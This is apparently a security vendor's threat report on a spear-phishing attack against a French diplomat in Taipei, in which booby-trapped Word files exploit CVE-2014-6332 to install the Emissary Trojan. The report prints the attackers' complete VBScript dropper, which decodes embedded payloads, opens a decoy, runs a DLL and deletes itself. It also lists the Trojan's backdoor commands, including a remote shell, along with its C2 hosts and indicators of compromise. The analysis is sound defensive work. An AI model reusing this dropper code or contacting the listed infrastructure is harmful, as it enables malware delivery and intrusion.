<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Attack on French Diplomat Linked to Operation Lotus Blossom","name":"Attack on French Diplomat Linked to Operation Lotus Blossom","description":"We observed a targeted attack in November directed at an individual working for the French Ministry of Foreign Affairs. The attack involved a spear-phishing email sent to a single French diplomat based in Taipei, Taiwan and contained an invitation to a Science and Technology support group event. The actors attempted to exploit CVE-2014-6332 using a","url":"https:\/\/unit42.paloaltonetworks.com\/attack-on-french-diplomat-linked-to-operation-lotus-blossom\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/attack-on-french-diplomat-linked-to-operation-lotus-blossom\/","datePublished":"December 18, 2015","articleBody":"We observed a targeted attack in November directed at an individual working for the French Ministry of Foreign Affairs. The attack involved a spear-phishing email sent to a single French diplomat based in Taipei, Taiwan and contained an invitation to a Science and Technology support group event.\r\n\r\nThe actors attempted to exploit CVE-2014-6332 using a slightly modified version of the proof-of-concept (POC) code to install a Trojan called Emissary, which is related to the Operation Lotus Blossom campaign. The TTPs used in this attack also match those detailed in the paper. The targeting of this individual suggests the actors are interested in breaching the French Ministry of Foreign Affairs itself or gaining insights into relations between France and Taiwan.\r\n\r\nWe have created the Emissary tag for AutoFocus users to track this threat.\r\nEn garde!\r\nOn November 10, 2015, threat actors sent a spear-phishing email to an individual at the French Ministry of Foreign Affairs. The subject and the body of the email suggest the targeted individual had been invited to a Science and Technology conference in Hsinchu, Taiwan. The e-mail appears quite timely, as the conference was held on November 13, 2015, which is three days after the attack took place.\r\n\r\nThe email body contained a link to the legitimate registration page for the conference, but the email also had two attachments with the following filenames that also pertain to the conference:\r\n\r\n\t\u8521\u82f1\u6587\u67ef\u5efa\u9298\u5168\u570b\u79d1\u6280\u5f8c\u63f4\u6703\u9080\u8acb\u51fd.doc (translates to \u201cTsai Ker Chien-ming National Science and Technology Support Association invitations.doc\u201d)\r\n\t\u66f8\u9762\u5831\u540d\u8868\u683c.doc (translates to \u201cWritten Application Form.doc\u201d)\r\n\r\nBoth attachments are malicious Word documents that attempt to exploit the Windows OLE Automation Array Remote Code Execution Vulnerability tracked by CVE-2014-6332. Upon successful exploitation, the attachments will install a Trojan named Emissary and open a Word document as a decoy.\r\n\r\nThe first attachment opens a decoy (Figure 2) that is a copy of an invitation to a Science and Technology conference this past November 13th held in Hsingchu, Taiwan, while the second opens a decoy (Figure 1) that is a registration form to attend the conference. The conference was widely advertised online and on Facebook, however in this case the invitation includes a detailed itinerary that does not seem to have appeared online. The Democratic Progressive\u2019s Party (DPP) Chairwoman Tsai Ing-wen and DPP caucus whip and Hsinchu representative Ker Chien-ming were the primary political sponsors of the conference and are longtime political allies. Tsai Ing-wen is the current front-runner for the Taiwanese Presidency and Ker Chien-ming may become Speaker if she wins. The conference focused on using open source technology, open international recruiting, and partnerships to continue developing Hsinchu as the Silicon Valley of Taiwan. It particularly noted France as an ally in this, and France is Taiwan\u2019s second largest technology partner and fourth largest trading partner in Europe.\r\n\r\n\r\nFigure 1 Decoy document containing written application form\r\n\r\nFigure 2 Decoy document containing the invitation and agenda for event\r\n\r\nExploiting CVE-2014-6332\r\nThe threat actors attempted to exploit CVE-2014-6332 using the POC code available in the wild. The POC code contains inline comments that explain how the malicious VBScript exploits this vulnerability, so instead of discussing the malicious script or exploit itself, we will focus on the portions of the script that the threat actors modified.\r\n\r\nThe actors removed the explanatory comments from the VBScript and made slight modifications to the POC code. The only major functional difference between the POC and the VBScript involved adding the ability to extract and run both a decoy document and payload. Figure 3 and 4 compare the differing \u201crunshell\u201d command within the POC and the malicious documents used in this attack. The code in Figure 3 shows that the POC does nothing more than launch the notepad.exe application upon successful exploitation. Figure 4 shows the malicious document creating a file named \u201css.vbs\u201d that it writes a VBScript to using a series of \u201cecho\u201d statements. After writing the VBScript, the malicious document executes the \u201css.vbs\u201d file.\r\nfunction runshell()\r\n  On Error Resume Next\r\n  set shell=createobject(\"Shell.Application\")\r\n  shell.ShellExecute \"notepad.exe\"\r\nend function\r\nFigure 3 Code block containing \u201crunshell\u201d function in CVE-2014-6332 proof-of-concept VBScript\r\n\r\nfunction runshell()\r\n  On Error Resume Next\r\n  set objshell= Createobject(\"WScript.Shell\")\r\n  strValue = objshell.RegRead(\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Local AppData\")\r\n  ename = \"rundll32\"\",\"\"\"\"\"\"\"&amp;strValue&amp;\"\\mm.dll\"\"\"\",Setting\"\r\n  outfile1= strValue&amp;\"\\mm.dll\"\r\n  bs = strValue&amp;\"\\ss.vbs\"\r\n  dn= strValue&amp;\"\\t.doc\"\r\n  v=window.location.href\r\n  v=Replace(v,\"file:\/\/\/\",\"\",1,1,1)\r\n  v=Replace(v,\"?.html\",\"\",1,1,1)\r\n  v=Replace(v,\"%20\",\" \",1)\r\n  v=Replace(v,\"\/\",\"\\\",1)            \r\n  cmd = \"cmd\"\r\n  arg=\" \/c taskkill  -f -im winword.exe \"\r\n  arg1= \"\"\",\"\"\"\r\n  set shell=createobject(\"wscript.shell\") \r\n  shell.run \"cmd.exe \/c \"\"echo On Error Resume Next &gt;\"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true  \r\n  shell.run \"cmd.exe \/c \"\"echo set shell=createobject(\"\"Shell.Application\"\") &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"    \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo shell.ShellExecute \"\"cmd\"\",\"\"\"&amp;arg&amp;\"\"\",\"\"\"\",\"\"\"\",0 &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"        \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo wscript.sleep 3000             &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo dim str                                                                      &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo dim L1                                                                       &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo dim L2                                                                       &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo dim Len                                                                      &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo dim infile                                                                   &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo dim outfile1                                                                 &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo dim outfile2                                                                 &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo infile = \"\"\"&amp;v&amp;\"\"\"                                                             &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo outfile1 = \"\"\"&amp;outfile1&amp;\"\"\"                                                           &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo outfile2 = \"\"\"&amp;dn&amp;\"\"\"                                                           &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo L1=     78924                                                                      &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo L2=     38912                                                                   &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo size=    144893                                                                 &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo offset1 = size-L1-L2                                                         &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo offset2 = size-L2                                                            &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo Len=0                                                                        &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo str = ReadBinary (infile,L1,offset1)                                         &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo WriteBinary outfile1, str                                                    &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo str = ReadBinary (infile,L2,offset2)                                         &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo WriteBinary outfile2, str                                                    &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo Function ReadBinary(FileName,length,offset)                                  &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   Dim Buf(), I                                                               &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true \r\n  shell.run \"cmd.exe \/c \"\"echo     Len =length -1                                                           &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo     ReDim Buf(Len)                                                           &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo     For I = 0 To Len: if(I=0)  then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if        &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo     Next                      &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo     .Close                                                                   &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   End With                                                                   &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   ReadBinary = Buf                                                           &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo End Function                                                                 &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo Sub WriteBinary(FileName, Buf)                                               &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   Dim I, aBuf, Size, bStream                                                 &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   Size = UBound(Buf): ReDim aBuf(Size \\ 2)                                   &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   For I = 0 To Size - 1 Step 2                                               &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo       aBuf(I \\ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))                          &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   Next                                                                       &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   If I = Size Then aBuf(I \\ 2) = ChrW(Buf(I))                                &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   aBuf=Join(aBuf, \"\"\"\")                                                      &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   Set bStream = CreateObject(\"\"ADODB.Stream\"\")                               &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   bStream.Type = 1: bStream.Open                                             &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   With CreateObject(\"\"ADODB.Stream\"\")                                        &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo     .Type = 2 : .Open: .WriteText aBuf                                       &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo     .Position = 2: .CopyTo bStream: .Close                                   &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   End With                                                                   &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   bStream.SaveToFile FileName, 2: bStream.Close                              &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo   Set bStream = Nothing                                                      &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo End Sub                                                                      &gt;&gt; \"\"\"&amp;bs&amp;\"\"\"  \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo set shell=createobject(\"\"Shell.Application\"\") &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"    \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo shell.ShellExecute \"\"\"&amp;dn&amp;\"\"\" &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"               \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo shell.ShellExecute \"\"\"&amp;ename&amp;\"\"\" &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"               \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo Set xa = CreateObject(\"\"Scripting.FileSystemObject\"\") &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"                      \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo If xa.FileExists(\"\"\"&amp;bs&amp;\"\"\") Then                     &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"                      \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo Set xb = xa.GetFile(\"\"\"&amp;bs&amp;\"\"\")                       &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"                      \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo xb.Delete                                             &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"                      \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"echo End If                                                &gt;&gt;\"\"\"&amp;bs&amp;\"\"\"                      \"\" \",0,true\r\n  shell.run \"cmd.exe \/c \"\"\"&amp;bs&amp;\"\"\"   \",0,true\r\nend function\r\nFigure 4 Code block containing \"runshell\" function in malicious VBScript within attachment\r\nThe ss.vbs file is responsible for locating the payload and decoy document from the initial malicious document, as well as decrypting, saving and opening both of the files. The script has hardcoded offsets to the location of both the payload and decoy document within the initial document. The script will decrypt both of the embedded files using a two-byte XOR loop that skips the first byte and then decrypts the remaining using \u201cA\u201d and \u201cC\u201d as the key. After decrypting the embedded files, the script saves the decoy to \u201ct.doc\u201d and the payload to \u201cmm.dll\u201d in the \u201c%APPDATA%\\LocalData\u201d folder. Finally, the script will open the decoy document and launch the payload by calling its exported function named \u201cSetting\u201d.\r\nOn Error Resume Next    \r\nset shell=createobject(\"Shell.Application\")      \r\nshell.ShellExecute \"cmd\",\" \/c taskkill  -f -im winword.exe \",\"\",\"\",0          \r\nwscript.sleep 3000                \r\ndim str                                                                         \r\ndim L1                                                                          \r\ndim L2                                                                          \r\ndim Len                                                                         \r\ndim infile                                                                      \r\ndim outfile1                                                                    \r\ndim outfile2                                                                    \r\ninfile = \"C:\\Documents and Settings\\&lt;username&gt;\\Desktop\\&lt;malicious document name&gt;.doc\"                                                               \r\noutfile1 = \"C:\\Documents and Settings\\&lt;username&gt;\\Local Settings\\Application Data\\mm.dll\"                                                              \r\noutfile2 = \"C:\\Documents and Settings\\&lt;username&gt;\\Local Settings\\Application Data\\t.doc\"                                                             \r\nL1=     78924                                                                         \r\nL2=     38912\r\nsize=    144893                                                                    \r\noffset1 = size-L1-L2                                                            \r\noffset2 = size-L2                                                               \r\nLen=0                                                                           \r\nstr = ReadBinary (infile,L1,offset1)                                            \r\nWriteBinary outfile1, str                                                      \r\nstr = ReadBinary (infile,L2,offset2)                                            \r\nWriteBinary outfile2, str                                                       \r\nFunction ReadBinary(FileName,length,offset)                                    \r\n  Dim Buf(), I                                                                  \r\n  With CreateObject(\"ADODB.Stream\")                                           \r\n    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position = offset    \r\n    Len =length -1                                                             \r\n    ReDim Buf(Len)                                                              \r\n    For I = 0 To Len: if(I=0)  then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if           \r\n    Next                         \r\n    .Close                                                                      \r\n  End With                                                                      \r\n  ReadBinary = Buf                                                              \r\nEnd Function                                                                    \r\nSub WriteBinary(FileName, Buf)                                                  \r\n  Dim I, aBuf, Size, bStream                                                    \r\n  Size = UBound(Buf): ReDim aBuf(Size \\ 2)                                      \r\n  For I = 0 To Size - 1 Step 2                                                  \r\n      aBuf(I \\ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))                             \r\n  Next                                                                          \r\n  If I = Size Then aBuf(I \\ 2) = ChrW(Buf(I))                                   \r\n  aBuf=Join(aBuf, \"\")                                                         \r\n  Set bStream = CreateObject(\"ADODB.Stream\")                                  \r\n  bStream.Type = 1: bStream.Open                                                \r\n  With CreateObject(\"ADODB.Stream\")                                           \r\n    .Type = 2 : .Open: .WriteText aBuf                                          \r\n    .Position = 2: .CopyTo bStream: .Close                                      \r\n  End With                                                                      \r\n  bStream.SaveToFile FileName, 2: bStream.Close                                 \r\n  Set bStream = Nothing                                                         \r\nEnd Sub                                                                         \r\nset shell=createobject(\"Shell.Application\")      \r\nshell.ShellExecute \"C:\\Documents and Settings\\&lt;username&gt;\\Local Settings\\Application Data\\t.doc\"                 \r\nshell.ShellExecute \"rundll32\",\"\"\"C:\\Documents and Settings\\&lt;username&gt;\\Local Settings\\Application Data\\mm.dll\"\",Setting\"                 \r\nSet xa = CreateObject(\"Scripting.FileSystemObject\")                        \r\nIf xa.FileExists(\"C:\\Documents and Settings\\&lt;username&gt;\\Local Settings\\Application Data\\ss.vbs\") Then                                            \r\nSet xb = xa.GetFile(\"C:\\Documents and Settings\\&lt;username&gt;\\Local Settings\\Application Data\\ss.vbs\")                                              \r\nxb.Delete                                                                    \r\nEnd If\r\nFigure 5 VBScript within ss.vbs responsible for extracting and running the payload and decoy\r\n\r\nEmissary 5.3 Analysis\r\nThe payload of this attack is a Trojan that we track with the name Emissary. This Trojan is related to the Elise backdoor described in the Operation Lotus Blossom report. Both Emissary and Elise are part of a malware group referred to as \u201cLStudio\u201d, which is based on the following debug strings found in Emissary and Elise samples:\r\n\r\nd:\\lstudio\\projects\\worldclient\\emissary\\Release\\emissary\\i386\\emissary.pdb\r\n\r\nd:\\lstudio\\projects\\lotus\\elise\\Release\\EliseDLL\\i386\\EliseDLL.pdb\r\n\r\nThere is code overlap between Emissary and Elise, specifically in the use of a common function to log debug messages to a file and a custom algorithm to decrypt the configuration file. The custom algorithm used by Emissary and Elise to decrypt their configurations use the \u201csrand\u201d function to set a seed value for the \u201crand\u201d function, which the algorithm uses to generate a key. While the \u201crand\u201d function is meant to generate random numbers, the malware author uses the \u201csrand\u201d function to seed the \u201crand\u201d function with a static value. The static seed value causes the \u201crand\u201d function to create the same values each time it is called and results in a static key to decrypt the configuration. The seed value is where the Emissary and Elise differ in their use of this algorithm, as Emissary uses a seed value of 1024 (as seen in Figure 6) and Elise uses the seed value of 2012.\r\n\r\n\r\nFigure 6 Custom algorithm in Emissary using 'srand' and 'rand' with 1024 as a seed value\r\nWhile these two Trojans share code, we consider Emissary and Elise separate tools since their configuration structure, command handler and C2 communications channel differ. The Emissary Trojan delivered in this attack contains the components listed in Table 1. At a high level, Emissary has an initial loader DLL that extracts a configuration file and a second DLL containing Emissary\u2019s functional code that it injects into Internet Explorer.\r\n\r\n\r\n\r\nMD5\r\nPath\r\nDescription\r\n\r\n\r\n06f1d2be5e981dee056c231d184db908\r\n%APPDATA%\\LocalData\\ishelp.dll\r\nLoader\r\n\r\n\r\n6278fc8c7bf14514353797b229d562e8\r\n%APPDATA%\\LocalData\\A08E81B411.DAT\r\nEmissary Payload\r\n\r\n\r\ne9f51a4e835929e513c3f30299567abc\r\n%APPDATA%\\LocalData\\75BD50EC.DAT\r\nConfiguration file\r\n\r\n\r\nvaries\r\n%TEMP%\\000A758C8FEAE5F.TMP\r\nLog file\r\n\r\n\r\n\r\nTable 1 Dropped files associated with Emissary Trojan seen in attack on French Ministry of Foreign Affairs\r\nThe loader Trojan named \u201cishelp.dll\u201d had an original name of \u201cLoader.dll\u201d, which will extract the Emissary payload from a resource named \"asdasdasdasdsad\" and write it to a file named \u201cA08E81B411.DAT\u201d. The loader will then write an embedded configuration to a file named \u201c75BD50EC.DAT\u201d. The loader Trojan creates a mutex named \u201c_MICROSOFT_LOADER_MUTEX_\u201d and finishes by injecting the Emissary DLL in \u201cA08E81B411.DAT\u201d into a newly spawned Internet Explorer process.\r\n\r\nThe Emissary Trojan runs within the Internet Explorer process. It begins by reading and decrypting its configuration file, which has the following structure:\r\nstruct emissary_config {\r\nWORD emissary_version_major;\r\nWORD emissary_version_minor;\r\nCHAR[36] GUID_for_sample;\r\nWORD Unknown1;\r\nCHAR[128] Server1;\r\nCHAR[128] Server2;\r\nCHAR[128] Server3;\r\nCHAR[128] CampaignName;\r\nCHAR[550] Unknown2;\r\nWORD Delay_interval_seconds;\r\n};\r\nWe decrypted and parsed the configuration file that accompanied the payload used in this attack, which resulted in the following settings:\r\n\r\nVersion: 5.3\r\nGUID: ba87c1c5-f71c-4a8b-b511-07aa113d9103\r\nC2 Server 1: http:\/\/ustar5.PassAs[.]us\/default.aspx\r\nC2 Server 2: http:\/\/203.124.14.229\/default.aspx\r\nC2 Server 3: http:\/\/dnt5b.myfw[.]us\/default.aspx\r\nCampaign Code: UPG-ZHG-01\r\nSleep Delay: 300\r\n\r\nAfter decrypting the configuration file, Emissary interacts with its command and control (C2) servers using HTTP or HTTPS, depending on the protocol specified in the configuration file. The initial network beacon sent from Emissary to its C2 server, seen in Figure 7, includes a Cookie field that contains a \u201cGUID\u201d, \u201cop\u201d and \u201cSHO\u201d field. The GUID field is a unique identifier for the compromised system that is obtained directly from the configuration file. The op field has a value of \u201c101\u201d, which is a static value that represents the initial network beacon. The SHO field contains the external IP address of the infected system, which Emissary obtains from a legitimate website \u201cshowip.net\u201d, specifically parsing the website\u2019s response for \u2018&lt;input id=\"checkip\" type=\"text\" name=\"check_ip\" value=\u2019, which contains the IP address of the system.\r\n\r\n\r\nFigure 7 Network beacon sent from Emissary Trojan to C2 server\r\nThe C2 server response to this beacon (seen in Figure 8) will contain a header field called \u201cSet-Cookie\u201d, which contains a value of \u201cSID\u201d. The SID value is base64 encoded and encrypted using a rolling XOR algorithm, which once decoded and decrypted contains a 36-character GUID value. The Emissary Trojan will use this GUID value provided by the C2 server as an encryption key that it will use to encrypt data sent in subsequent network communications.\r\n\r\n\r\nFigure 8 C2 response to Emissary beacon\r\nThe C2 server provides commands to the Trojan as a three digit numeric string within the data portion of the HTTP response (in the form of \u201cop=&lt;command&gt;\u201d), which the Emissary Trojan will decrypt and compare to a list of commands within its command handler. The command handler function within the Emissary Trojan supports six commands, as seen in Table 2.\r\n\r\n\r\n\r\nCommand\r\nDescription\r\n\r\n\r\n102\r\nUpload a file to the C2 server.\r\n\r\n\r\n103\r\nExecutes a specified command.\r\n\r\n\r\n104\r\nDownload file from the C2 server.\r\n\r\n\r\n105\r\nUpdate configuration file.\r\n\r\n\r\n106\r\nCreate a remote shell.\r\n\r\n\r\n107\r\nUpdates the Trojan with a new executable.\r\n\r\n\r\n\r\nTable 2 Command handler within Emissary version 5.3\r\nIf the command issued from the C2 server does not match the one listed in the Trojan saves the message \"unkown:%s\"\u00a0to the log file. The command set available within Emissary allows the threat actors backdoor access to a compromised system. Using this access, the threat actors can exfiltrate data and carry out further activities on the system, including interacting directly with the system\u2019s command shell and downloading and executing additional tools for further functionality.\r\nThreat Infrastructure\r\nThe infrastructure associated with the Emissary C2 servers used in this attack includes ustar5.PassAs[.]us, 203.124.14.229 and dnt5b.myfw[.]us. The infrastructure is rather isolated as the only overlap in domains includes appletree.onthenetas[.]com. The overlap, as seen in Figure 9 involves two IP addresses that during the same time frame resolved both the appletree.onthenetas[.]com domain and the Emissary C2 domain of ustar5.PassAs[.]us. The other C2 domain used by this Emissary payload, specifically dnt5b.myfw[.]us currently resolves to the 127.0.0.1. This provides another glimpse into TTPs for these threat actors, as it suggests that the threat actors set the secondary C2 domains to resolve to the localhost IP address to avoid network detection and change this to a routable IP address when they need the C2 server operational. Additionally, while this infrastructure does not overlap with that used in Operation Lotus Blossom, that also fits with the TTPs. In each case, the threat actors used separate infrastructure for different targets, another way to help avoid detection.\r\n\r\n\r\nFigure 9 Infrastructure associated with Emissary Trojan\r\n\r\nConclusion\r\nAPT threat actors, most likely nation state-sponsored, targeted a diplomat in the French Ministry of Foreign Affairs with a seemingly legitimate invitation to a technology conference in Taiwan. It is entirely possible the diplomat was truly invited to the conference, or at least would not have been surprised by the invitation, adding to the likelihood the attachment would have been opened. The actors were attempting to exploit CVE-2014-6332 to install a new version of the Emissary Trojan, specifically version 5.3.\r\n\r\nThe Emissary Trojan is related to the Elise malware used in Operation Lotus Blossom, which was an attack campaign on targets in Southeast Asia, in many cases also with official looking decoy documents that do not appear to have been available online. Additionally, the targeting of a French diplomat based in Taipei, Taiwan aligns with previous targeting by these actors, as does the separate infrastructure. Based on the targeting and lures, Unit 42 assesses that the threat actors\u2019 collection requirements not only include militaries and government agencies in Southeast Asia, but also nations involved in diplomatic and trade agreements with them.\r\nIndicators\r\nRelated Hashes\r\n748feae269d561d80563eae551ef7bfd -\u66f8\u9762\u5831\u540d\u8868\u683c.doc\r\n9fd6f702763a9840bd1b3a898eb9c62d -\u8521\u82f1\u6587\u67ef\u5efa\u9298\u5168\u570b\u79d1\u6280\u5f8c\u63f4\u6703\u9080\u8acb\u51fd.doc\r\n06f1d2be5e981dee056c231d184db908 - ishelp.dll\r\n6278fc8c7bf14514353797b229d562e8 - A08E81B411.DAT\r\ne9f51a4e835929e513c3f30299567abc - 75BD50EC.DAT\r\n\r\nCommand and Control\r\n203.124.14.229\r\nustar5.PassAs[.]us\r\nappletree.onthenetas[.]com\r\ndnt5b.myfw[.]us","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"","width":"","height":""},"speakable":{"@type":"SpeakableSpecification","xPath":["\/html\/head\/title","\/html\/head\/meta[@name='description']\/@content"]},"author":[{"@type":"Person","name":"Robert Falcone"},{"@type":"Person","name":"Jen Miller-Osborn"}]}</script><link rel='stylesheet' id='crayon-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' media='all' />

    var STYLE_ID = 'at-body-style';
    function getParent() {
    return doc.getElementsByTagName('head')[0];
    }
    function addStyle(parent, id, def) {
        if (!parent) {
        return;
        }
        var style = doc.createElement('style');
        style.id = id;
        style.innerHTML = def;
        parent.appendChild(style);
    }
    function removeStyle(parent, id) {
        if (!parent) {
            return;
        }
        var style = doc.getElementById(id);
        if (!style) {
            return;
        }
        parent.removeChild(style);
    }

	function getCookie(cname) {
	 	var name = cname + "=";
  		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
  		for(var i = 0; i <ca.length; i++) {
    			var c = ca[i];
    			while (c.charAt(0) == ' ') {
     				 c = c.substring(1);
    			}
    			if (c.indexOf(name) == 0) {
    				 return c.substring(name.length, c.length);
    			}
  		}
  		return "";
	}

        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/content/pan/en_US/search/unit42search";
		    }
    if(referer == 'Ngfw'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/ngfw-cdss-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/search/ngfwcdsssearch";
    }
    httpGet(menu_url,'menu_html');
    document.getElementById('main-nav-menu-cont').removeAttribute("style");
}
function addStyle(styles) {            
    /* Create style document */
    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) 
        css.styleSheet.cssText = styles;
    else 
        css.appendChild(document.createTextNode(styles));

    /* Append style to the tag name */
    document.getElementsByTagName("head")[0].appendChild(css);
}
function httpGet(theUrl,req_type) {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
